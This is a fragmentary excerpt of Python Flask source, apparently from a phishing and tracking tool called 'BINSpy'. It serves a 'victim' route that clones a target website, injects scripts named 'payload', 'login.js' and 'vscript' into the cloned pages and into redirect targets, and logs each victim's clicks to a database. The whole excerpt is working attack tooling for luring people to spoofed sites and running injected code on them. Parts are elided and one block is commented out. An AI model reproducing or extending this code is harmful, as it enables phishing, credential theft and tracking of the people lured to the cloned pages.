...
class victim_server(object):
    @app.route("/" + BINSpy.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        """
        clone_html  = opener.open(BINSpy.url_to_clone).read()
        soup = BeautifulSoup(clone_html, 'lxml')
        parsed_uri = urlparse(BINSpy.url_to_clone)
        ...
        for img in soup.find_all('img'):
            ...
            if url is not None:
                if url.startswith('/'):
                    clone_html = clone_html.replace(url, domain + url)
        """
        if (BINSpy.type_lure == 'local'):
            html = assignScripts(victim_inject_code(render_template("/" + BINSpy.url_to_clone), 'payload', '/', BINSpy.gmaps))
        else:
            html = assignScripts(victim_inject_code(opener.open(BINSpy.url_to_clone).read(), 'payload', BINSpy.url_to_clone, BINSpy.gmaps))
        return html
    ...
    def register():
        ...
        db.sentences_victim('insert_click', [vId, BINSpy.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
    ...
    def redirectVictim():
        ...
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, BINSpy.gmaps))
        return html
...
def assignScripts(code):
    code = code.replace("base.js", BINSpy.JSFiles[0]['src'])
    code = code.replace("libs.min.js",BINSpy.JSFiles[1]['src'])
    code = code.replace("login.js", BINSpy.JSFiles[2]['src'])
    code = code.replace("payload.js", BINSpy.JSFiles[3]['src'])
    code = code.replace("BINSpy.js", BINSpy.JSFiles[4]['src'])
    code = code.replace("vscript.js", BINSpy.JSFiles[5]['src'])
    return code